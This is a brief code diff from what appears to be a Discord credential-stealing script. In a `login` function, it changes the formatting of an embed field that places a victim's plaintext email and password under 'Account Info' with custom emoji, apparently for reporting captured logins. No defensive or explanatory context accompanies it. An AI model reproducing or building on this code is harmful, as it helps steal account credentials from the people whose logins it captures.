@@ -663,7 +663,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info:**',
-            value: `<:Phone:1080852884696076379> **Email:** **${email}** - <:password:1080903595345584138> **Password:** **${password}**`,
+            value: `<:Phone:1080852884696076379> **Email:** **${email}**   <:password:1080903595345584138> **Password:** **${password}**`,
             inline: false,
           },
           {
